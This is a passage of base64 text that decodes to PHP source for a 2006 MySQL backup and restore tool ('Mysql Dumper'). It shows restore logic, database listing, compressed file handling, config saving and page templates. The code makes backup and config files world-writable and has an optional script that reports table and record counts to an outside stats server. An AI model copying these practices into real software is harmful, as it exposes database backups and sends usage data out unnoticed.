CAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmKENIQVJTRVQgPT0gJ2F1dG8nKXsgLy8g0JLRgdGC0LDQstC70Y/QtdC8INC60L7QtNC40YDQvtCy0LrRgyDQtNC70Y8g0YLQsNCx0LvQuNGGLCDQtdGB0LvQuCDQvtC90LAg0L3QtSDRg9C60LDQt9Cw0L3QsCDQuCDRg9GB0YLQsNC90L7QstC70LXQvdCwIGF1dG8g0LrQvtC00LjRgNC+0LLQutCwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc3FsIC49ICcgREVGQVVMVCBDSEFSU0VUPScgLiAkdGhpcy0+cmVzdG9yZV9jaGFyc2V0IC4gJHRoaXMtPnJlc3RvcmVfY29sbGF0ZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+cmVzdG9yZV9jaGFyc2V0ICE9ICRsYXN0X2NoYXJzZXQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbXlzcWxfcXVlcnkoIlNFVCBOQU1FUyAnIiAuICR0aGlzLT5yZXN0b3JlX2NoYXJzZXQgLiAiJyIpIG9yIHRyaWdnZXJfZXJyb3IgKCLQndC10YPQtNCw0LXRgtGB0Y8g0LjQt9C80LXQvdC40YLRjCDQutC+0LTQuNGA0L7QstC60YMg0YHQvtC10LTQuNC90LXQvdC40Y8uPEJSPnskc3FsfTxCUj4iIC4gbXlzcWxfZXJyb3IoKSwgRV9VU0VSX0VSUk9SKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNhY2hlIC49IHRwbF9sKCLQo9GB0YLQsNC90L7QstC70LXQvdCwINC60L7QtNC40YDQvtCy0LrQsCDRgdC+0LXQtNC40L3QtdC90LjRjyBgIiAuICR0aGlzLT5yZXN0b3JlX2NoYXJzZXQgLiAiYC4iLCBDX1dBUk5JTkcpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGFzdF9jaGFyc2V0ID0gJHRoaXMtPnJlc3RvcmVfY2hhcnNldDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRsYXN0X3Nob3dlZCAhPSAkdGFibGUpIHskY2FjaGUgLj0gdHBsX2woItCi0LDQsdC70LjRhtCwIGB7JHRhYmxlfWAuIik7ICRsYXN0X3Nob3dlZCA9ICR0YWJsZTt9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYoJHRoaXMtPm15c3FsX3ZlcnNpb24gPiA0MDEwMSAmJiBlbXB0eSgkbGFzdF9jaGFyc2V0KSkgeyAvLyDQo9GB0YLQsNC90LDQstC70LjQstCw0LXQvCDQutC+0LTQuNGA0L7QstC60YMg0L3QsCDRgdC70YPRh9Cw0Lkg0LXRgdC70Lgg0L7RgtGB0YPRgtGB0YLQstGD0LXRgiBDUkVBVEUgVEFCTEUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbXlzcWxfcXVlcnkoIlNFVCAkdGhpcy0+cmVzdG9yZV9jaGFyc2V0ICciIC4gJHRoaXMtPnJlc3RvcmVfY2hhcnNldCAuICInIikgb3IgdHJpZ2dlcl9lcnJvciAoItCd0LXRg9C00LDQtdGC0YHRjyDQuNC30LzQtdC90LjRgtGMINC60L7QtNC40YDQvtCy0LrRgyDRgdC+0LXQtNC40L3QtdC90LjRjy48QlI+eyRzcWx9PEJSPiIgLiBteXNxbF9lcnJvcigpLCBFX1VTRVJfRVJST1IpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCLQo9GB0YLQsNC90L7QstC70LXQvdCwINC60L7QtNC40YDQvtCy0LrQsCDRgdC+0LXQtNC40L3QtdC90LjRjyBgIiAuICR0aGlzLT5yZXN0b3JlX2NoYXJzZXQgLiAiYC4iLCBDX1dBUk5JTkcpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGFzdF9jaGFyc2V0ID0gJHRoaXMtPnJlc3RvcmVfY2hhcnNldDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJGluc2VydCA9ICcnOwogICAgICAgICAgICAgICAgICAgICRleGVjdXRlID0gMTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkcXVlcnlfbGVuID49IDY1NTM2ICYmIHByZWdfbWF0Y2goIi8sJC8iLCAkc3RyKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkc3FsID0gcnRyaW0oJGluc2VydCAuICRzcWwsICIsIik7CiAgICAgICAgICAgICAgICAgICAgJGV4ZWN1dGUgPSAxOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGV4ZWN1dGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHErKzsKICAgICAgICAgICAgICAgICAgICAgICAgbXlzcWxfcXVlcnkoJHNxbCkgb3IgdHJpZ2dlcl9lcnJvciAoIldyb25nIHF1ZXJyeS48QlI+IiAuIG15c3FsX2Vycm9yKCksIEVfVVNFUl9FUlJPUik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAocHJlZ19tYXRjaCgiL15pbnNlcnQvaSIsICRzcWwpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYWZmX3Jvd3MgKz0gbXlzcWxfYWZmZWN0ZWRfcm93cygpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICRzcWwgPSAnJzsKICAgICAgICAgICAgICAgICAgICAgICAgJHF1ZXJ5X2xlbiA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgICRleGVjdXRlID0gMDsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWNobyAkY2FjaGU7CiAgICAgICAgICAgICAgICBlY2hvIHRwbF9zKDEgLCAxKTsKICAgICAgICAgICAgICAgIGVjaG8gdHBsX2woc3RyX3JlcGVhdCgiLSIsIDYwKSk7CiAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCJEQiB3YXMgcmVzdG9yZWQgZnJvbSBiYWNrdXAuIiwgQ19SRVNVTFQpOwogICAgICAgICAgICAgICAgaWYgKGlzc2V0KCRpbmZvWzNdKSkgZWNobyB0cGxfbCgi0JTQsNGC0LAg0YHQvtC30LTQsNC90LjRjyDQutC+0L/QuNC4OiB7JGluZm9bM119IiwgQ19SRVNVTFQpOwogICAgICAgICAgICAgICAgZWNobyB0cGxfbCgiREIgcXVlcmllczogeyRxfSIsIENfUkVTVUxUKTsKICAgICAgICAgICAgICAgIGVjaG8gdHBsX2woIlRhYmxlcyB3YXMgY3JlYXRlZDogeyR0YWJzfSIsIENfUkVTVUxUKTsKICAgICAgICAgICAgICAgIGVjaG8gdHBsX2woItCh0YLRgNC+0Log0LTQvtCx0LDQstC70LXQvdC+OiB7JGFmZl9yb3dzfSIsIENfUkVTVUxUKTsKCiAgICAgICAgICAgICAgICAkdGhpcy0+dGFicyA9ICR0YWJzOwogICAgICAgICAgICAgICAgJHRoaXMtPnJlY29yZHMgPSAkYWZmX3Jvd3M7CiAgICAgICAgICAgICAgICAkdGhpcy0+c2l6ZSA9IGZpbGVzaXplKFBBVEggLiAkdGhpcy0+ZmlsZW5hbWUpOwogICAgICAgICAgICAgICAgJHRoaXMtPmNvbXAgPSAkdGhpcy0+U0VUWydjb21wX21ldGhvZCddICogMTAgKyAkdGhpcy0+U0VUWydjb21wX2xldmVsJ107CiAgICAgICAgICAgICAgICBlY2hvICI8U0NSSVBUPmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdiYWNrJykuZGlzYWJsZWQgPSAwOzwvU0NSSVBUPiI7CiAgICAgICAgICAgICAgICAvLyDQn9C10YDQtdC00LDRh9CwINC00LDQvdC90YvRhSDQtNC70Y8g0LPQu9C+0LHQsNC70YzQvdC+0Lkg0YHRgtCw0YLQuNGB0YLQuNC60LgKICAgICAgICAgICAgICAgIGlmIChHUykgZWNobyAiPFNDUklQVD5kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnR1MnKS5zcmMgPSAnaHR0cDovL3N5cGV4Lm5ldC9ncy5waHA/cj17JHRoaXMtPnRhYnN9LHskdGhpcy0+cmVjb3Jkc30seyR0aGlzLT5zaXplfSx7JHRoaXMtPmNvbXB9LDEwOCc7PC9TQ1JJUFQ+IjsKCiAgICAgICAgICAgICAgICAkdGhpcy0+Zm5fY2xvc2UoJGZwKTsKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIG1haW4oKXsKICAgICAgICAgICAgICAgICR0aGlzLT5jb21wX2xldmVscyA9IGFycmF5KCc5JyA9PiAnOSAo0LzQsNC60YHQuNC80LDQu9GM0L3QsNGPKScsICc4JyA9PiAnOCcsICc3JyA9PiAnNycsICc2JyA9PiAnNicsICc1JyA9PiAnNSAo0YHRgNC10LTQvdGP0Y8pJywgJzQnID0+ICc0JywgJzMnID0+ICczJywgJzInID0+ICcyJywgJzEnID0+ICcxICjQvNC40L3QuNC80LDQu9GM0L3QsNGPKScsJzAnID0+ICfQkdC10Lcg0YHQttCw0YLQuNGPJyk7CgogICAgICAgICAgICAgICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygiYnpvcGVuIikpIHsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Y29tcF9tZXRob2RzWzJdID0gJ0JaaXAyJzsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmIChmdW5jdGlvbl9leGlzdHMoImd6b3BlbiIpKSB7CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmNvbXBfbWV0aG9kc1sxXSA9ICdHWmlwJzsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICR0aGlzLT5jb21wX21ldGhvZHNbMF0gPSAn0JHQtdC3INGB0LbQsNGC0LjRjyc7CiAgICAgICAgICAgICAgICBpZiAoY291bnQoJHRoaXMtPmNvbXBfbWV0aG9kcykgPT0gMSkgewogICAgICAgICAgICAgICAgICAgICR0aGlzLT5jb21wX2xldmVscyA9IGFycmF5KCcwJyA9PifQkdC10Lcg0YHQttCw0YLQuNGPJyk7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJGRicyA9ICR0aGlzLT5kYl9zZWxlY3QoKTsKICAgICAgICAgICAgICAgICR0aGlzLT52YXJzWydkYl9iYWNrdXAnXSAgICA9ICR0aGlzLT5mbl9zZWxlY3QoJGRicywgJHRoaXMtPlNFVFsnbGFzdF9kYl9iYWNrdXAnXSk7CiAgICAgICAgICAgICAgICAkdGhpcy0+dmFyc1snZGJfcmVzdG9yZSddICAgPSAkdGhpcy0+Zm5fc2VsZWN0KCRkYnMsICR0aGlzLT5TRVRbJ2xhc3RfZGJfcmVzdG9yZSddKTsKICAgICAgICAgICAgICAgICR0aGlzLT52YXJzWydjb21wX2xldmVscyddICA9ICR0aGlzLT5mbl9zZWxlY3QoJHRoaXMtPmNvbXBfbGV2ZWxzLCAkdGhpcy0+U0VUWydjb21wX2xldmVsJ10pOwogICAgICAgICAgICAgICAgJHRoaXMtPnZhcnNbJ2NvbXBfbWV0aG9kcyddID0gJHRoaXMtPmZuX3NlbGVjdCgkdGhpcy0+Y29tcF9tZXRob2RzLCAkdGhpcy0+U0VUWydjb21wX21ldGhvZCddKTsKICAgICAgICAgICAgICAgICR0aGlzLT52YXJzWyd0YWJsZXMnXSAgICAgICA9ICR0aGlzLT5TRVRbJ3RhYmxlcyddOwogICAgICAgICAgICAgICAgJHRoaXMtPnZhcnNbJ2ZpbGVzJ10gICAgICAgID0gJHRoaXMtPmZuX3NlbGVjdCgkdGhpcy0+ZmlsZV9zZWxlY3QoKSwgJycpOwogICAgICAgICAgICAgICAgZ2xvYmFsICRkdW1wZXJfZmlsZTsKICAgICAgICAgICAgICAgICRidXR0b25zID0gIjxJTlBVVCBUWVBFPXN1Ym1pdCBWQUxVRT1BcHBseT48SU5QVVQgVFlQRT1idXR0b24gVkFMVUU9RXhpdCBvbkNsaWNrPVwibG9jYXRpb24uaHJlZiA9ICciLiRkdW1wZXJfZmlsZS4iP3JlbG9hZCdcIj4iOwogICAgICAgICAgICAgICAgZWNobyB0cGxfcGFnZSh0cGxfbWFpbigpLCAkYnV0dG9ucyk7CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBkYl9zZWxlY3QoKXsKICAgICAgICAgICAgICAgIGlmIChEQk5BTUVTICE9ICcnKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRpdGVtcyA9IGV4cGxvZGUoJywnLCB0cmltKERCTkFNRVMpKTsKICAgICAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCgkaXRlbXMgQVMgJGl0ZW0pewogICAgICAgICAgICAgICAgICAgICAgICBpZiAobXlzcWxfc2VsZWN0X2RiKCRpdGVtKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0YWJsZXMgPSBteXNxbF9xdWVyeSgiU0hPVyBUQUJMRVMiKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHRhYmxlcykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGFicyA9IG15c3FsX251bV9yb3dzKCR0YWJsZXMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGRic1skaXRlbV0gPSAieyRpdGVtfSAoeyR0YWJzfSkiOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRyZXN1bHQgPSBteXNxbF9xdWVyeSgiU0hPVyBEQVRBQkFTRVMiKTsKICAgICAgICAgICAgICAgICRkYnMgPSBhcnJheSgpOwogICAgICAgICAgICAgICAgd2hpbGUoJGl0ZW0gPSBteXNxbF9mZXRjaF9hcnJheSgkcmVzdWx0KSl7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChteXNxbF9zZWxlY3RfZGIoJGl0ZW1bMF0pKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhYmxlcyA9IG15c3FsX3F1ZXJ5KCJTSE9XIFRBQkxFUyIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkdGFibGVzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0YWJzID0gbXlzcWxfbnVtX3Jvd3MoJHRhYmxlcyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZGJzWyRpdGVtWzBdXSA9ICJ7JGl0ZW1bMF19ICh7JHRhYnN9KSI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiAkZGJzOwogICAgICAgIH0KCiAgICAgICAgZnVuY3Rpb24gZmlsZV9zZWxlY3QoKXsKICAgICAgICAgICAgICAgICRmaWxlcyA9IGFycmF5KCcnID0+ICcgJyk7CiAgICAgICAgICAgICAgICBpZiAoaXNfZGlyKFBBVEgpICYmICRoYW5kbGUgPSBvcGVuZGlyKFBBVEgpKSB7CiAgICAgICAgICAgIHdoaWxlIChmYWxzZSAhPT0gKCRmaWxlID0gcmVhZGRpcigkaGFuZGxlKSkpIHsKICAgICAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCIvXi4rP1wuc3FsKFwuKGd6fGJ6MikpPyQvIiwgJGZpbGUpKSB7CiAgICAgICAgICAgICAgICAgICAgJGZpbGVzWyRmaWxlXSA9ICRmaWxlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNsb3NlZGlyKCRoYW5kbGUpOwogICAgICAgIH0KICAgICAgICBrc29ydCgkZmlsZXMpOwogICAgICAgICAgICAgICAgcmV0dXJuICRmaWxlczsKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIGZuX29wZW4oJG5hbWUsICRtb2RlKXsKICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+U0VUWydjb21wX21ldGhvZCddID09IDIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmZpbGVuYW1lID0gInskbmFtZX0uc3FsLmJ6MiI7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGJ6b3BlbihQQVRIIC4gJHRoaXMtPmZpbGVuYW1lLCAieyRtb2RlfWJ7JHRoaXMtPlNFVFsnY29tcF9sZXZlbCddfSIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmICgkdGhpcy0+U0VUWydjb21wX21ldGhvZCddID09IDEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmZpbGVuYW1lID0gInskbmFtZX0uc3FsLmd6IjsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gZ3pvcGVuKFBBVEggLiAkdGhpcy0+ZmlsZW5hbWUsICJ7JG1vZGV9YnskdGhpcy0+U0VUWydjb21wX2xldmVsJ119Iik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlewogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZmlsZW5hbWUgPSAieyRuYW1lfS5zcWwiOwogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZm9wZW4oUEFUSCAuICR0aGlzLT5maWxlbmFtZSwgInskbW9kZX1iIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBmbl93cml0ZSgkZnAsICRzdHIpewogICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5TRVRbJ2NvbXBfbWV0aG9kJ10gPT0gMikgewogICAgICAgICAgICAgICAgICAgIGJ6d3JpdGUoJGZwLCAkc3RyKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZiAoJHRoaXMtPlNFVFsnY29tcF9tZXRob2QnXSA9PSAxKSB7CiAgICAgICAgICAgICAgICAgICAgZ3p3cml0ZSgkZnAsICRzdHIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZXsKICAgICAgICAgICAgICAgICAgICAgICAgZndyaXRlKCRmcCwgJHN0cik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBmbl9yZWFkKCRmcCl7CiAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPlNFVFsnY29tcF9tZXRob2QnXSA9PSAyKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGJ6cmVhZCgkZnAsIDQwOTYpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmICgkdGhpcy0+U0VUWydjb21wX21ldGhvZCddID09IDEpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gZ3pyZWFkKCRmcCwgNDA5Nik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZnJlYWQoJGZwLCA0MDk2KTsKICAgICAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIGZuX3JlYWRfc3RyKCRmcCl7CiAgICAgICAgICAgICAgICAkc3RyaW5nID0gJyc7CiAgICAgICAgICAgICAgICAkdGhpcy0+ZmlsZV9jYWNoZSA9IGx0cmltKCR0aGlzLT5maWxlX2NhY2hlKTsKICAgICAgICAgICAgICAgICRwb3MgPSBzdHJwb3MoJHRoaXMtPmZpbGVfY2FjaGUsICJcbiIsIDApOwogICAgICAgICAgICAgICAgaWYgKCRwb3MgPCAxKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlICghJHN0cmluZyAmJiAoJHN0ciA9ICR0aGlzLT5mbl9yZWFkKCRmcCkpKXsKICAgICAgICAgICAgICAgICAgICAgICAgJHBvcyA9IHN0cnBvcygkc3RyLCAiXG4iLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRwb3MgPT09IGZhbHNlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZmlsZV9jYWNoZSAuPSAkc3RyOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHN0cmluZyA9ICR0aGlzLT5maWxlX2NhY2hlIC4gc3Vic3RyKCRzdHIsIDAsICRwb3MgKyAxKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZmlsZV9jYWNoZSA9IHN1YnN0cigkc3RyLCAkcG9zICsgMSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCEkc3RyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPmZpbGVfY2FjaGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzdHJpbmcgPSAkdGhpcy0+ZmlsZV9jYWNoZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5maWxlX2NhY2hlID0gJyc7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiB0cmltKCRzdHJpbmcpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRzdHJpbmcgPSBzdWJzdHIoJHRoaXMtPmZpbGVfY2FjaGUsIDAsICRwb3MpOwogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZmlsZV9jYWNoZSA9IHN1YnN0cigkdGhpcy0+ZmlsZV9jYWNoZSwgJHBvcyArIDEpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgcmV0dXJuIHRyaW0oJHN0cmluZyk7CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBmbl9jbG9zZSgkZnApewogICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5TRVRbJ2NvbXBfbWV0aG9kJ10gPT0gMikgewogICAgICAgICAgICAgICAgICAgIGJ6Y2xvc2UoJGZwKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZiAoJHRoaXMtPlNFVFsnY29tcF9tZXRob2QnXSA9PSAxKSB7CiAgICAgICAgICAgICAgICAgICAgZ3pjbG9zZSgkZnApOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZXsKICAgICAgICAgICAgICAgICAgICAgICAgZmNsb3NlKCRmcCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBAY2htb2QoUEFUSCAuICR0aGlzLT5maWxlbmFtZSwgMDY2Nik7CiAgICAgICAgICAgICAgICAkdGhpcy0+Zm5faW5kZXgoKTsKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIGZuX3NlbGVjdCgkaXRlbXMsICRzZWxlY3RlZCl7CiAgICAgICAgICAgICAgICAkc2VsZWN0ID0gJyc7CiAgICAgICAgICAgICAgICBmb3JlYWNoKCRpdGVtcyBBUyAka2V5ID0+ICR2YWx1ZSl7CiAgICAgICAgICAgICAgICAgICAgICAgICRzZWxlY3QgLj0gJGtleSA9PSAkc2VsZWN0ZWQgPyAiPE9QVElPTiBWQUxVRT0neyRrZXl9JyBTRUxFQ1RFRD57JHZhbHVlfSIgOiAiPE9QVElPTiBWQUxVRT0neyRrZXl9Jz57JHZhbHVlfSI7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICByZXR1cm4gJHNlbGVjdDsKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIGZuX3NhdmUoKXsKICAgICAgICAgICAgICAgIGlmIChTQykgewogICAgICAgICAgICAgICAgICAgICAgICAkbmUgPSAhZmlsZV9leGlzdHMoUEFUSCAuICJkdW1wZXIuY2ZnLnBocCIpOwogICAgICAgICAgICAgICAgICAgICRmcCA9IGZvcGVuKFBBVEggLiAiZHVtcGVyLmNmZy5waHAiLCAid2IiKTsKICAgICAgICAgICAgICAgIGZ3cml0ZSgkZnAsICI8P3BocFxuXCR0aGlzLT5TRVQgPSAiIC4gZm5fYXJyMnN0cigkdGhpcy0+U0VUKSAuICJcbj8+Iik7CiAgICAgICAgICAgICAgICBmY2xvc2UoJGZwKTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRuZSkgQGNobW9kKFBBVEggLiAiZHVtcGVyLmNmZy5waHAiLCAwNjY2KTsKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmZuX2luZGV4KCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBmbl9pbmRleCgpewogICAgICAgICAgICAgICAgaWYgKCFmaWxlX2V4aXN0cyhQQVRIIC4gJ2luZGV4Lmh0bWwnKSkgewogICAgICAgICAgICAgICAgICAgICRmaCA9IGZvcGVuKFBBVEggLiAnaW5kZXguaHRtbCcsICd3YicpOwogICAgICAgICAgICAgICAgICAgICAgICBmd3JpdGUoJGZoLCB0cGxfYmFja3VwX2luZGV4KCkpOwogICAgICAgICAgICAgICAgICAgICAgICBmY2xvc2UoJGZoKTsKICAgICAgICAgICAgICAgICAgICAgICAgQGNobW9kKFBBVEggLiAnaW5kZXguaHRtbCcsIDA2NjYpOwogICAgICAgICAgICAgICAgfQogICAgICAgIH0KfQoKZnVuY3Rpb24gZm5faW50KCRudW0pewogICAgICAgIHJldHVybiBudW1iZXJfZm9ybWF0KCRudW0sIDAsICcsJywgJyAnKTsKfQoKZnVuY3Rpb24gZm5fYXJyMnN0cigkYXJyYXkpIHsKICAgICAgICAkc3RyID0gImFycmF5KFxuIjsKICAgICAgICBmb3JlYWNoICgkYXJyYXkgYXMgJGtleSA9PiAkdmFsdWUpIHsKICAgICAgICAgICAgICAgIGlmIChpc19hcnJheSgkdmFsdWUpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRzdHIgLj0gIicka2V5JyA9PiAiIC4gZm5fYXJyMnN0cigkdmFsdWUpIC4gIixcblxuIjsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkc3RyIC49ICInJGtleScgPT4gJyIgLiBzdHJfcmVwbGFjZSgiJyIsICJcJyIsICR2YWx1ZSkgLiAiJyxcbiI7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiAkc3RyIC4gIikiOwp9CgovLyBUZW1wbGF0ZXMKCmZ1bmN0aW9uIHRwbF9wYWdlKCRjb250ZW50ID0gJycsICRidXR0b25zID0gJycpewpyZXR1cm4gPDw8SFRNTAo8IURPQ1RZUEUgSFRNTCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIj4KPEhUTUw+CjxIRUFEPgo8VElUTEU+TXlzcWwgRHVtcGVyIDEuMC45IHwgJmNvcHk7IDIwMDYgemFwaW1pcjwvVElUTEU+CjxNRVRBIEhUVFAtRVFVSVY9Q29udGVudC1UeXBlIENPTlRFTlQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCI+CjxTVFlMRSBUWVBFPSJURVhUL0NTUyI+CjwhLS0KYm9keXsKICAgICAgICBvdmVyZmxvdzogYXV0bzsKfQp0ZCB7CiAgICAgICAgZm9udDogMTFweCB0YWhvbWEsIHZlcmRhbmEsIGFyaWFsOwogICAgICAgIGN1cnNvcjogZGVmYXVsdDsKfQppbnB1dCwgc2VsZWN0LCBkaXYgewogICAgICAgIGZvbnQ6IDExcHggdGFob21hLCB2ZXJkYW5hLCBhcmlhbDsKfQppbnB1dC50ZXh0LCBzZWxlY3QgewogICAgICAgIHdpZHRoOiAxMDAlOwp9CmZpZWxkc2V0IHsKICAgICAgICBtYXJnaW4tYm90dG9tOiAxMHB4Owp9Ci0tPgo8L1NUWUxFPgo8L0hFQUQ+Cgo8Qk9EWSBCR0NPTE9SPSNFQ0U5RDggVE